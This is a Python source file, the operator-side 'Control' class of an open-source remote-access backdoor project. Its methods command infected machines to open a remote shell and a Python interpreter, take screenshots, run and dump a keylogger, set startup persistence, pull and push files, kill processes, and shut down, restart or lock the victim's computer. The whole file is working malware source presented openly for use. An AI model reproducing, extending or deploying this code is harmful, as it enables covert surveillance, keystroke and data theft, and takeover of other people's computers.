"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""
import logging
import time

from src import errors, helper
from src.defs import *


class Control:
    def __init__(self, socket):
        self.socket = socket
        self.logger = logging.getLogger(LOGGER_ID)

    def info(self):
        out = ""
        info = self.socket.get_curr_address()
        for key in info:
            out += f"{key}: {info[key]}\n"

        print(out, end="")

    def interact(self, index):
        try:
            self.socket.select(index)
            info = self.socket.get_curr_address()
            self.logger.info(f"Connected to {info['ip']}:{info['port']} ({info['hostname']})")
            return True
        except errors.ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return False

    def startup(self, remove=False):
        if remove:
            self.socket.send_json(CLIENT_RMV_STARTUP)
        else:
            self.socket.send_json(CLIENT_ADD_STARTUP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            self.logger.error(rsp["value"])
        elif rsp["key"] == SUCCESS:
            self.logger.info("OK.")

    def command_shell(self, index=-1):
        if index != -1:
            try:
                self.socket.select(index)
                info = self.socket.get_curr_address()
                self.logger.info(f"Connected to {info['ip']}:{info['port']} ({info['hostname']})")
            except errors.ServerSocket.InvalidIndex as e:
                self.logger.error(e)
                return

        self.socket.send_json(CLIENT_SHELL)

        init = self.socket.recv_json()

        if init["key"] == SERVER_SHELL_DIR:
            prompt = f"{init['value']}>"
        else:
            prompt = ">"

        while True:
            command = input(prompt)

            if command.lower() in ["exit", "exit()"]:
                self.socket.send_json(CLIENT_SHELL_LEAVE)
                break

            elif len(command) > 0:
                self.socket.send_json(CLIENT_SHELL_CMD, command)

                rsp = self.socket.recv_json()

                if rsp["key"] == SERVER_COMMAND_RSP:
                    data = self.socket.recvall(rsp["value"]["buffer"])

                    print(data.decode())
                elif rsp["key"] == SERVER_SHELL_DIR:
                    prompt = f"{rsp['value']}>"

    def python_interpreter(self):
        self.socket.send_json(CLIENT_PYTHON_INTERPRETER)

        while True:
            command = input("python> ")
            if command.strip() == "":
                continue
            if command.lower() in ["exit", "exit()"]:
                break

            self.socket.send_json(CLIENT_PYTHON_INTERPRETER_CMD, command)

            rsp = self.socket.recv_json()

            if rsp["key"] == SERVER_PYTHON_INTERPRETER_RSP:
                data = self.socket.recvall(rsp["value"]["buffer"]).decode("utf-8").rstrip("\n")

                if data != "":
                    print(f"\n{data}")

        self.socket.send_json(CLIENT_PYTHON_INTERPRETER_LEAVE)

    def screenshot(self):
        self.socket.send_json(CLIENT_SCREENSHOT)

        rsp = self.socket.recv_json()

        if rsp["key"] == SERVER_SCREENSHOT:
            buffer = rsp["value"]["buffer"]

            self.logger.info(f"File size: {buffer} bytes")

            data = self.socket.recvall(buffer)

            file = time.strftime("%Y%m%d%H%M%S.png")

            with open(file, "wb") as objPic:
                objPic.write(data)

            self.logger.info(f"Total bytes received: {os.path.getsize(file)} bytes")

    def keylogger_start(self):
        self.socket.send_json(CLIENT_KEYLOG_START)
        self.logger.info("OK.")

    def keylogger_stop(self):
        self.socket.send_json(CLIENT_KEYLOG_STOP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            self.logger.error(rsp["value"])
        elif rsp["key"] == SUCCESS:
            self.logger.info("OK.")

    def keylogger_dump(self):
        self.socket.send_json(CLIENT_KEYLOG_DUMP)

        rsp = self.socket.recv_json()

        if rsp["key"] == ERROR:
            self.logger.error(rsp["value"])
        elif rsp["key"] == SUCCESS:
            print(self.socket.recvall(rsp["value"]["buffer"]).decode())

    def receive_file(self):
        file = helper.remove_quotes(input("Target file: "))
        out_file = helper.remove_quotes(input("Output File: "))

        if file == "" or out_file == "":  # if the user left an input blank
            return

        self.socket.send_json(CLIENT_RECV_FILE, file)

        rsp = self.socket.recv_json()

        if rsp["key"] == SERVER_FILE_RECV:
            buffer = rsp["value"]["buffer"]

            self.logger.info(f"File size: {buffer} bytes")

            file_data = self.socket.recvall(buffer)

            try:
                with open(out_file, "wb") as _file:
                    _file.write(file_data)
            except Exception as e:
                self.logger.error(f"Error writing to file {e}")
                return

            self.logger.info(f"Total bytes received: {os.path.getsize(out_file)} bytes")

        elif rsp["key"] == ERROR:
            self.logger.error(rsp["value"])

    def send_file(self):
        file = helper.remove_quotes(input("File to send: "))

        if not os.path.isfile(file):
            self.logger.error(f"File {file} not found")
            return

        out_file = helper.remove_quotes(input("Output File: "))

        if out_file == "":  # if the input is blank
            return

        with open(file, "rb") as _file:
            self.socket.sendall_json(CLIENT_UPLOAD_FILE, _file.read(), sub_value=out_file, is_bytes=True)

        rsp = self.socket.recv_json()

        if rsp["key"] == SUCCESS:
            self.logger.info("OK.")
        elif rsp["key"] == ERROR:
            self.logger.error(rsp["value"])

    def message(self, message):
        self.socket.send_json(CLIENT_MSG, message)
        self.logger.info("OK.")

    def toggle_disable_process(self, process):
        self.socket.send_json(CLIENT_DISABLE_PROCESS, process)

        rsp = self.socket.recv_json()

        if rsp["key"] == SUCCESS:
            self.logger.info(rsp["value"])
        else:
            self.logger.error(rsp["value"])

    def shutdown(self):
        self.socket.send_json(CLIENT_SHUTDOWN)
        self.logger.info("OK.")

    def restart(self):
        self.socket.send_json(CLIENT_RESTART)
        self.logger.info("OK.")

    def lock(self):
        self.socket.send_json(CLIENT_LOCK)
        self.logger.info("OK.")
